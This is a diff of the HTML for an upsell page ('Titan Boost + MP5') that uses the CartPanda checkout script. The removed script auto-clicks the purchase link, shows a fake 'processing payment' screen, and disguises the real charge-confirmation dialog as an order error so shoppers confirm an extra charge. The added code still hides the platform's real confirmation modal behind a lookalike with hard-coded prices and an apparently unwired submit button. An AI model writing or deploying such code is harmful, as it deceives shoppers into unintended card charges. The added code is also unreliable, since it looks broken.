@@ -5,206 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Special Offer - Titan Boost + MP5</title>
   
-                <script
-                src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js">
-                </script>
+  <!-- CartPanda script -->
+  <script src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js"></script>
+  <script>
+    new OcuExternal();
+  </script>
 
-                <script>
-                new OcuExternal();
-                </script>
-            
-<script>
-document.addEventListener('DOMContentLoaded', () => {
-  // 1) Injeta CSS do container e da .cartpanda-modal-content conforme o padrão CartPanda
-  const style = document.createElement('style');
-  style.innerHTML = `
-    @import url(https://fonts.bunny.net/css?family=inter:400,600);
-    /* container full-screen */
-    #cartpanda-modal-container,
-    div#cartpandaModal {
-      position: fixed; top:0; left:0;
-      width:100%; height:100%;
-      overflow:auto;
-      background-color: rgba(0,0,0,0.4);
-      z-index: 99999;
-      padding-top: 100px;
-    }
-    /* content box */
-    div#cartpandaModal .cartpanda-modal-content {
-      background-color: #fefefe;
-      border: 1px solid #888;
-      border-radius: 10px;
-      width: 35%;
-      margin: 0 auto;
-    }
-    @media screen and (max-width:768px){
-      div#cartpandaModal .cartpanda-modal-content { width:95%; }
-    }
-    /* form, header, close */
-    form#cartpanda-payment-form { position: relative; margin:0; }
-    .cartpanda-modal-header {
-      display:flex; justify-content:space-between; align-items:center;
-      border-radius:10px 10px 0 0; color:#565956;
-    }
-    button.cartpanda-modal-close {
-      position:absolute; right:0; padding:10px 15px;
-      background:#fff; border:none; border-radius:10px;
-      color:#aaa; font-weight:700;
-    }
-    button.cartpanda-modal-close:hover,
-    button.cartpanda-modal-close:active {
-      color:#000; cursor:pointer; text-decoration:none;
-    }
-    /* body */
-    .cartpanda-modal-body { padding:2rem; margin:0; }
-    p.cartpanda-modal-title {
-      text-align:center; margin:0 0 .875rem; color:#141a27;
-    }
-    p.cartpanda-modal-description {
-      text-align:center; margin:10px 0 20px;
-      color:#5b636e; line-height:1.3rem;
-    }
-    /* footer & buttons */
-    footer.cartpanda-modal-footer {
-      display:flex; flex-wrap:wrap; justify-content:center;
-      gap:6px; padding-bottom:2rem;
-      border-bottom-left-radius:10px;
-      border-bottom-right-radius:10px;
-    }
-    button.cartpanda-secondary-button {
-      padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
-      background:#fff; border:1px solid #eeeff1; border-radius:.3rem;
-      color:#404958; cursor:pointer;
-    }
-    button.cartpanda-secondary-button:hover {
-      background:#f5f7ff; border-color:#3b82f6;
-    }
-    button.cartpanda-primary-button {
-      padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
-      background:#2f51f6; border:1px solid #2f51f6; border-radius:.3rem;
-      color:#fff; cursor:pointer; margin-left:10px;
-    }
-    button.cartpanda-primary-button:hover {
-      background:#3b82f6; border-color:#3b82f6;
-    }
-    button.cartpanda-primary-button:focus {
-      outline:none; box-shadow:0 0 0 3px rgba(66,153,225,.5);
-    }
-  `;
-  document.head.appendChild(style);
-
-  // 2) Overlay full-screen com spinner + instruções
-  const overlay = document.createElement('div');
-  overlay.id = 'customOverlay';
-  Object.assign(overlay.style, {
-    position:'fixed', top:'0', left:'0',
-    width:'100%', height:'100%',
-    background:'rgba(255,255,255,0.95)',
-    zIndex:'100000', display:'flex',
-    flexDirection:'column', justifyContent:'center',
-    alignItems:'center', textAlign:'center',
-    fontFamily:`'Inter', system-ui, sans-serif`
-  });
-  overlay.innerHTML = `
-    <div class="spinner" style="
-      border:8px solid #f3f3f3;
-      border-top:8px solid #3498db;
-      border-radius:50%;
-      width:60px; height:60px;
-      animation:spin 1s linear infinite;
-      margin-bottom:20px;
-    "></div>
-    <div class="msg" style="
-      font-size:1.125rem;font-weight:600;color:#141a27;margin:5px 0;
-    ">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
-    <div class="msg" style="
-      font-size:1.125rem;font-weight:600;color:#141a27;margin:5px 0;
-    ">PROCESSANDO SEU PAGAMENTO</div>
-    <div class="error" style="
-      display:none;
-      font-size:1rem;font-weight:600;color:#565956;margin-top:20px;
-      pointer-events:none;
-    ">
-      HOUVE UM ERRO EM SEU PEDIDO<br>
-      CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-    </div>
-  `;
-  document.body.appendChild(overlay);
-
-  // 3) Dispara BUY NOW após 1s
-  setTimeout(() => {
-    const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
-    if (buy) buy.click();
-  },1000);
-
-  // 4) Observa injeção do modal original
-  const mo = new MutationObserver((muts, obs) => {
-    for (const { addedNodes } of muts) {
-      for (const node of addedNodes) {
-        if (!(node instanceof HTMLElement)) continue;
-        if (
-          node.id==='cartpanda-modal-container' ||
-          node.id==='cartpandaModal' ||
-          node.classList.contains('cartpanda-modal')
-        ) {
-          // 5) transição do overlay
-          overlay.querySelector('.spinner').style.display='none';
-          overlay.querySelectorAll('.msg').forEach(e=>e.style.display='none');
-          overlay.querySelector('.error').style.display='block';
-          overlay.style.pointerEvents='none';
-
-          // 6) Esconde o conteúdo original, mas mantém o botão real em DOM
-          const origContent = node.querySelector('.cartpanda-modal-content');
-          if (origContent) origContent.style.visibility='hidden';
-          const realConfirm = node.querySelector('button.cartpanda-primary-button');
-          const realDecline = node.querySelector('button.cartpanda-secondary-button');
-          const realClose   = node.querySelector('button.cartpanda-modal-close');
-
-          // 7) Cria nova .cartpanda-modal-content alinhada com o container
-          const custom = document.createElement('div');
-          custom.className = 'cartpanda-modal-content';
-          custom.innerHTML = `
-            <form id="custom-form">
-              <div class="cartpanda-modal-header">
-                <button type="button" class="cartpanda-modal-close" id="customClose">&times;</button>
-              </div>
-              <div class="cartpanda-modal-body">
-                <p class="cartpanda-modal-title">HOUVE UM ERRO EM SEU PEDIDO</p>
-                <p class="cartpanda-modal-description">CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO</p>
-              </div>
-              <footer class="cartpanda-modal-footer">
-                <button type="button" class="cartpanda-secondary-button" id="customDecline">
-                  NÃO, OBRIGADO
-                </button>
-                <button type="button" class="cartpanda-primary-button" id="customConfirm">
-                  SIM, CONFIRMAR
-                </button>
-              </footer>
-            </form>
-          `;
-          node.appendChild(custom);
-
-          // 8) Liga eventos dos botões customizados
-          document.getElementById('customClose').onclick = () => {
-            if (realClose) realClose.click();
-          };
-          document.getElementById('customDecline').onclick = () => {
-            if (realDecline) realDecline.click();
-          };
-          document.getElementById('customConfirm').onclick = () => {
-            if (realConfirm) realConfirm.click();
-          };
-
-          obs.disconnect();
-          return;
-        }
-      }
-    }
-  });
-  mo.observe(document.body, { childList:true, subtree:true });
-});
-</script>
-
+  <!-- Página existente Styles -->
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -261,8 +68,201 @@ document.addEventListener('DOMContentLoaded', () => {
       margin: 0;
     }
   </style>
+
+  <!-- Custom modal CSS -->
+  <style>
+    /* Overlay */
+    #custom-modal-container {
+      display: none;
+      position: fixed;
+      z-index: 99999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.4);
+    }
+
+    /* Modal root */
+    #customModal {
+      display: block;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+      padding-top: 100px;
+      font-family: system-ui, sans-serif;
+      z-index: 99999;
+    }
+
+    /* Caixa branca central */
+    .custom-modal-content {
+      background-color: #FEFEFE;
+      border: 1px solid #888;
+      border-radius: 10px;
+      margin: auto;
+      width: 35%;
+    }
+    @media screen and (max-width: 768px) {
+      .custom-modal-content { width: 95%; }
+    }
+
+    /* Botão de fechar */
+    .custom-modal-close {
+      background: #FFF;
+      border: none;
+      border-radius: 10px;
+      color: #AAA;
+      font-weight: 700;
+      padding: 10px 15px;
+      position: absolute;
+      top: 0; right: 0;
+    }
+    .custom-modal-close:hover {
+      color: #000;
+      cursor: pointer;
+    }
+
+    /* Corpo do modal */
+    .custom-modal-body {
+      margin: 0;
+      padding: 2rem;
+      text-align: center;
+    }
+    .custom-modal-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #141A27;
+      margin: 0 0 .875rem;
+    }
+    .custom-modal-description {
+      font-size: .875rem;
+      font-weight: 400;
+      color: #5B636E;
+      line-height: 1.3rem;
+      margin: 10px 0 20px;
+    }
+
+    /* Detalhes de preço */
+    .custom-product-details {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .custom-price-wrapper {
+      background-color: #F9FAFB;
+      border-radius: 7px;
+      padding: 1rem;
+      width: 80%;
+    }
+    @media screen and (max-width: 768px) {
+      .custom-price-wrapper { width: 100%; }
+    }
+    .custom-price-row {
+      display: flex;
+      justify-content: space-between;
+      padding: .625rem 0 1rem;
+      border-bottom: 2px solid #EFF0F3;
+    }
+    .popup-offer-price {
+      font-size: 1.125rem;
+      font-weight: 600;
+      color: #141A27 !important;
+    }
+    .custom-price-info-text {
+      font-size: .875rem;
+      font-weight: 400;
+      color: #5B636E !important;
+    }
+
+    /* Rodapé e botões */
+    .custom-modal-footer {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      justify-content: center;
+      padding-bottom: 2rem;
+      border-bottom-left-radius: 10px;
+      border-bottom-right-radius: 10px;
+    }
+    .custom-secondary-button {
+      background-color: #FFF;
+      border: 1px solid #EEEFF1;
+      border-radius: .3rem;
+      color: #404958;
+      padding: .625rem 1.25rem;
+      font-size: .875rem;
+      cursor: pointer;
+    }
+    .custom-secondary-button:hover {
+      background-color: #F5F7FF;
+      border-color: #3B82F6;
+    }
+    .custom-primary-button {
+      background-color: #2F51F6;
+      border: 1px solid #2F51F6;
+      border-radius: .3rem;
+      color: #FFF;
+      padding: .625rem 1.25rem;
+      margin-left: 10px;
+      font-size: .875rem;
+      cursor: pointer;
+    }
+    .custom-primary-button:hover {
+      background-color: #3B82F6;
+      border-color: #3B82F6;
+    }
+    .custom-primary-button:focus {
+      box-shadow: 0 0 0 3px rgba(66,153,225,.5);
+      outline: none;
+    }
+  </style>
 </head>
 <body>
+  <!-- Custom modal (escondido até o CartPanda abrir) -->
+  <div id="custom-modal-container">
+    <div id="customModal">
+      <div class="custom-modal-content">
+        <form id="custom-payment-form" style="position: relative;">
+          <!-- Botão fechar -->
+          <button type="button" class="custom-modal-close" aria-label="Close modal">×</button>
+          <!-- Corpo -->
+          <div class="custom-modal-body">
+            <p class="custom-modal-title">Additional payment of <span class="popup-offer-price">$0.34</span></p>
+            <p class="custom-modal-description">This is a new offer. You will be charged an additional amount on your card.</p>
+            <div class="custom-product-details">
+              <div class="custom-price-wrapper">
+                <div class="custom-price-row">
+                  <div class="popup-offer-price">$0.34</div>
+                  <div class="custom-price-info-text">One-time payment</div>
+                </div>
+                <div class="custom-price-row" style="border-bottom:none; padding-bottom:.5rem;">
+                  <div class="custom-price-info-text">Estimated taxes</div>
+                  <div class="popup-estimated-tax" style="color:#141A27!important; font-size:.875rem; font-weight:500;">$0.00</div>
+                </div>
+                <div class="custom-price-row" style="border-bottom:none;">
+                  <div class="custom-price-info-text">Previous spending</div>
+                  <div class="popup-total-order-amount" style="color:#141A27!important; font-size:.875rem; font-weight:500;">$0.14</div>
+                </div>
+                <div style="display:flex; align-items:center; margin-top:.5rem;">
+                  <div style="margin-right:3px; display:flex; align-items:center;">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0,0,256,256"><g fill="#5f6a77" stroke="#5f6a77" stroke-width="3"><g transform="scale(2,2)"><path d="M64,6c-32,0 -58,26 -58,58c0,32 26,58 58,58 32,0 58,-26 58,-58 0,-32 -26,-58 -58,-58zM64,12c28.7,0 52,23.3 52,52c0,28.7 -23.3,52 -52,52 -28.7,0 -52,-23.3 -52,-52 0,-28.7 23.3,-52 52,-52zM64,59c-5,0 -9,4 -9,9v24c0,5 4,9 9,9 5,0 9,-4 9,-9v-24c0,-5 -4,-9 -9,-9z"/></g></g></svg>
+                  </div>
+                  <small class="custom-price-info-text">You will be charged immediately</small>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- Rodapé e botões -->
+          <footer class="custom-modal-footer">
+            <button type="button" class="custom-secondary-button">No, thanks</button>
+            <button type="submit" class="custom-primary-button">Yes, proceed with payment</button>
+          </footer>
+        </form>
+      </div>
+    </div>
+  </div>
+
   <div class="top-menu">
     <p>STEP 1 OF 2</p>
   </div>
@@ -337,5 +337,26 @@ document.addEventListener('DOMContentLoaded', () => {
     <p>See you on the other side,<br>
     Dr. David Cain</p>
   </div>
+
+  <script>
+    // Observa quando o modal da CartPanda é exibido
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((m) => {
+        const orig = document.getElementById('cartpanda-modal-container');
+        if (orig && orig.style.display !== 'none') {
+          orig.style.display = 'none';
+          document.getElementById('custom-modal-container').style.display = 'block';
+        }
+      });
+    });
+    observer.observe(document.body, { attributes: true, subtree: true, attributeFilter: ['style'] });
+
+    // Fechar modal customizado
+    document.addEventListener('click', (e) => {
+      if (e.target.matches('.custom-modal-close') || e.target.matches('.custom-secondary-button')) {
+        document.getElementById('custom-modal-container').style.display = 'none';
+      }
+    });
+  </script>
 </body>
 </html>
